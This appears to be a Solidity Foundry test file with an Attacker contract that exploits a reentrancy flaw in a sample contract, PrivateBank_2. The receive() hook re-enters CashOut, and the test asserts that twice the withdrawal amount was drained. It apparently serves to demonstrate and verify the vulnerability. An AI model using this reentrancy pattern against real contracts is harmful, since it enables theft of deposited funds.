
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {
    PrivateBank_2 public _contractUnderTest;
    Log public transferLog;
    Attacker public _attacker;

    function setUp() public {
        transferLog = new Log();
        _contractUnderTest = new PrivateBank_2(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        vm.deal(address(this), attackVal * 3);
        vm.deal(address(_attacker), 0);
        vm.deal(address(_contractUnderTest), 0);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        _victim = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedVal = val;
        _victim.CashOut(val);
        uint256 finalBalance = address(this).balance;
        if (finalBalance == initialSnapshot + 2 * val && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.CashOut(storedVal);
        }
    }
}
